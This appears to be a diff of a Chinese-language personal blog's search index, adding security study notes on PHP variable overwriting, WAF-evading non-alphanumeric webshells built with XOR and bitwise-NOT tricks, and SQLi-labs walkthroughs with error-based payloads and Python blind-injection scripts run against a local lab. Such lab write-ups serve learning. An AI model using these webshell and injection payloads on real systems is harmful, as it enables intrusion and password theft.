@@ -1,38 +1,473 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1</title>
+    <title>变量覆盖</title>
     <url>/2021/11/23/1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在php中不正确的使用extract()、parse_str()以及import_request_variables()</p>
+<p>函数会导致用户输入的变量值覆盖程序中原有的变量。例如更改黑名单</p>
+<h2 id="extract（）函数"><a href="#extract（）函数" class="headerlink" title="extract（）函数"></a>extract（）函数</h2><p>该函数是接受一个数组并把该数组解析成变量，键名为变量名，键值为变量值，</p>
+<p>此函数可以接受3个值，第二个值该函数的配置，第三个值是在开启不覆盖原变量的情况下将变量的值附给第三个值</p>
+<h2 id="pars-str（）函数"><a href="#pars-str（）函数" class="headerlink" title="pars_str（）函数"></a>pars_str（）函数</h2><p>该函数是把字符串解析成变量例如“a=1”会被解析成$a=1，如果变量a之前存在，就会被覆盖，还可以加第二值为数组，这样解析出的变量就会存在数组中。</p>
+<h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><p>该函数会接收POST,COOKIE,GET的值并把他们转化从变量并会覆盖原有的变量可以用GPC代替</p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    		<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>)&#123;</span><br><span class="line">        		<span class="keyword">echo</span> <span class="variable">$_key</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        		<span class="variable">$$_key</span> = addslashes(<span class="variable">$_value</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在输入?a=1的时候$key=a</p>
+<p>所以$$_key就是$a就成了给a赋值的语句</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>无字符getshell</title>
+    <url>/2021/11/23/2-3-4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在waf特别强的情况下，把所有的字符和数字都ban了，就要使用无字符getshell。</p>
+<p>原理，既然字符被过滤了，只要我们输入的不是字符，但能让服务器解析成字符。比如我们要的是2，但2被过滤了，那么我们就可以用1+1代替2。无字符也是同理，我们可以用异或运算来输出字符，或者汉字取反</p>
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>附上大佬的异或脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;~!@#$%^&amp;*()_+\|/?,.&lt;&gt;`-=&#123;&#125;[]&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;strlen(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&gt;<span class="number">64</span> &amp;&amp; ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&lt;<span class="number">91</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> chr(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27; &#x27;</span>.ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"> &#125;<span class="keyword">elseif</span> (ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&gt;<span class="number">96</span> &amp;&amp; ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&lt;<span class="number">122</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> chr(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>{^+=P<br>“@”^”(“);//h<br>[^&gt;=e<br>[^-=v<br>]^&lt;=a<br>,^@=l<br>+^[=p<br>`^/=O<br>.^}=S<br>/^{=T</p>
+<p>此为部分输出结果</p>
+<p>用该结果我们可以拼出一个一句话木马</p>
+<p>&lt;?= @”[[],”^”&gt;-&lt;@”($_”+`./“^”[/}{“[‘“+”^”[“‘]); ?&gt;</p>
+<h2 id="汉字取反"><a href="#汉字取反" class="headerlink" title="汉字取反"></a>汉字取反</h2><p>脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;mb_strlen(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$st</span> = mb_substr(<span class="variable">$str</span>, <span class="variable">$i</span>,<span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = ~(<span class="variable">$st</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$a</span>[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;T&#x27;</span>)		<span class="comment">#$_GET[&#x27;&#x27;]想要得到的字符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$st</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>部分输出结果</p>
+<p>的e<br>前v<br>瞰a<br>品l<br>说P<br>小O<br>次S<br>站T    </p>
+<p>利用，因为有些题目会把数字也同样过滤所以我们可以用true来表示1</p>
+<p>拼接一句话</p>
+=
+$\_\_=[];$\_\_\__=$__==$__;
+
+$\_=\~(的)[$\_\_\_\_];$\_.=~(前)[$\_\_\_\_\];$\_.=~(瞰)[$\_\_\_\_\];$_.=~(品)[$\_\_\_\_\];
+
+$\_\_\_=\~(样)[$\_\_\_\_];$\_\_\_\.=~(说)[$\_\_\_\_\];$\_\__\.=~(小)[$\_\_\_\_];$\_\_\_.=~(次)[$\_\_\_\_];$\_\_\_.=~(站)[$\_\__\_];$\_\_\_\_=~(瞰)[$\_\__\_];
+
+$\_($\$\__\_[$\_]);
+
+<?=是<?php的缩写
+]]></content>
   </entry>
   <entry>
     <title>3</title>
     <url>/2021/11/23/3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用的是phpstudy的集成环境，直接在phpstudy里打开php配置项配置debug</p>
+<p>端口接听默认为9000我改成了9001</p>
+<p><img src="/.com//p/picture/k.jpg" alt="picture"></p>
+<p>打开php.ini添加debug配置idekey</p>
+<p><img src="/.com//p/picture/j.jpg" alt="picture"></p>
+<p>打开phpstorm文件打开设置</p>
+<p><img src="/.com//p/picture/k.jpg" alt="picture"></p>
+<p>选择服务器</p>
+<p>名称自定义写什么都没关系</p>
+<p>主机写你的本地php网址，或者本地ip127.0.0.1</p>
+<p><img src="/.com//p/picture/ii.jpg" alt="picture"></p>
+<p>点开右上角的运行调试配置，新建一个phpweb配置项</p>
+<p><img src="/.com//p/picture/image-20211016204431247.png" alt="picyure"></p>
+<p>把服务器设置成之前配置的</p>
+<p>然后点右上角的📞图样，打开监听，在点旁边的绿色肥甲虫，debug</p>
+]]></content>
   </entry>
   <entry>
-    <title>2,3,4</title>
-    <url>/2021/11/23/2-3-4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-  </entry>
-  <entry>
-    <title>6</title>
-    <url>/2021/11/23/6/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-  </entry>
-  <entry>
-    <title>5</title>
+    <title>sqlilab17</title>
     <url>/2021/11/23/5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="updata报错注入"><a href="#updata报错注入" class="headerlink" title="updata报错注入"></a>updata报错注入</h1><p>![](D:\p\picture\屏幕截图 2021-10-25 214004.png)</p>
+<p>看都题目passwor reset，重置密码，在输对用户名的正确的情况下会把用户名的密码更改为我们输入的密码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214449.png)</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
+<p>再来康康源码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214805.png)</p>
+<p>我们看到他先用select查出了用户名密码然后再用了updata把新的密码上传</p>
+<p>password=’$password‘说明这里要用’闭合</p>
+<p>再来看返回的值</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
+<p>没有回显点，也不是布朗类型的返回，看看会不会报错</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 215546.png)</p>
+<p>有报错那就用报错注入</p>
+<p>构造playload</p>
+<p>1’ and updatexml(1,concat(0x76,(select group_concat(password) from users),0x76),2)#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 220011.png)</p>
+<p>报错了，意思是不能在要updata的表里查数据，那么我们套一层子查询，间接查询</p>
+<p>重新构造playload</p>
+<p>重新构造playload</p>
+<p>1’ and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users) as a),0x7e),1)#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 221120.png)</p>
+<p>updatexml()的报错原理和groupby差不多，在updatexml的三个参数中输入不符合xml语法的内容就会报错并执行输入的语句</p>
+]]></content>
   </entry>
   <entry>
-    <title>4</title>
+    <title>sql盲注脚本</title>
     <url>/2021/11/23/4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python写sql注入脚本"><a href="#python写sql注入脚本" class="headerlink" title="python写sql注入脚本"></a>python写sql注入脚本</h1><p>在布尔盲注和时间盲注需要一个一个试的时候就需要使用python脚本</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以sqlilab第8关为例</p>
+<p>![pictuer](D:.\picture\屏幕截图 2021-10-25 122458.png)</p>
+<p>查询成功就会返回you are in查询不成功就不返回，</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-25 161517.png)</p>
+<p>可用这个特性猜测 playload annd ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database()))=123</p>
+<p>判断表名得第一个字母的asc码值</p>
+<p>由此一个一个推断就可以得到完整的表名</p>
+<p>但手工写太累了这时候就需要写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#引入requests库</span></span><br><span class="line">s = requests.session()<span class="comment">#创建session对象用来发送请求</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span><span class="comment">#Playload的构建</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:<span class="comment">#发送playload并判断是否成功</span></span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))<span class="comment">#成功就输出值</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;--+&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> s.get(url + dataname).text:</span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line"><span class="comment"># leng=o(&#x27;and length(database())=&#x27;)</span></span><br><span class="line"><span class="comment"># dbname=no(&quot;and ascii(substr(database(),&quot;, leng)</span></span><br><span class="line"><span class="comment">#tablename=no(&quot;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &quot;,30)</span></span><br><span class="line"><span class="comment">#columnname=no(&quot;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;, 100)</span></span><br><span class="line"><span class="comment">#password=no(&quot;and ascii(substr((select group_concat(password) from users),&quot;, 200)</span></span><br><span class="line">name=no(<span class="string">&quot;and ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
+
+<p>![](D:\p\picture\屏幕截图 2021-10-25 165010.png)</p>
+<p>得到了数据</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>以sqlilab第9关为例无论输入什么都只会显示you are in，那就要用到时间盲注，sleep函数会让网页的响应延迟自定义的秒数，写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs-master/Less-10/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:</span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;,sleep(5),1)--+&quot;</span></span><br><span class="line">                Starttime=time.time()<span class="comment">#记录下当前的时间戳</span></span><br><span class="line">                response1 = requests.get(url+dataname)<span class="comment">#获取网页回应</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> time.time() - Starttime &gt; <span class="number">5</span>:<span class="comment">#获取网页回应需要的时间</span></span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line">j=no(<span class="string">&quot;and if(ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)<span class="comment">#if判断if（a，b，c）若a为真输出b，假输出c</span></span><br></pre></td></tr></table></figure>
+
+<p>![](D:\p\picture\屏幕截图 2021-10-25 171419.png)</p>
+<p>得到结果</p>
+]]></content>
   </entry>
   <entry>
-    <title>7</title>
+    <title>sqli_lab1819</title>
     <url>/2021/11/23/7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql注入之header报错注入"><a href="#sql注入之header报错注入" class="headerlink" title="sql注入之header报错注入"></a>sql注入之header报错注入</h1><h3 id="首先要知道什么是header头"><a href="#首先要知道什么是header头" class="headerlink" title="首先要知道什么是header头"></a>首先要知道什么是header头</h3><p>header是发送请求时携带的头部信息。通常一些鉴权的信息：authentication/cookie、响应的数据格式：content-type等等的设置。当然响应的数据也会返回一些头部信息。</p>
+<p>格式是 域名 ：域值</p>
+<h1 id="18"><a href="#18" class="headerlink" title="18"></a>18</h1><p>![](D:\p\picture\屏幕截图 2021-10-26 120723.png)</p>
+<p>输入用户名和密码，在第17关改过的</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-26 120949.png)</p>
+<p>登入成功，并把User Agent的内容显示出来了</p>
+<p>这个头是显示用户信息的头</p>
+<p>所以就可在这个头进行注入</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-26 121622.png)</p>
+<p>因为该题没有回显点，所以用报错注入</p>
+<p>playload: ‘ or uodate(1,concat(‘#’,(select group_concat(password) from users),’#’ ),2)#</p>
+<h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><p>在来看看19的</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-26 171745.png)</p>
+<p>输出的是Referer的值，说以把Referer的值改成我们的sql注入语句，19也没有回显点，也用报错注入，</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-26 172953.png)</p>
+<p>报错，这句话的意思是列的数量不匹配</p>
+<p>将or改成，</p>
+<p>1’,updatexml(1,concat(‘<del>‘,(select group_concat(password) from users),’</del>‘),1))#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-26 195738.png)</p>
+<p>成功</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqlzj</title>
+    <url>/2021/11/23/6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在两个select注入语句之间用可用；隔开，</p>
+<p>如果在php中用来mysqli_mulit_qurry()函数来执行sql注入语句的时候，可以使用堆叠注入，堆叠注入可以做到对数据库的改增删操作，</p>
+<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><p>在php中对单词的过滤，一般可以用双写，大写来绕过</p>
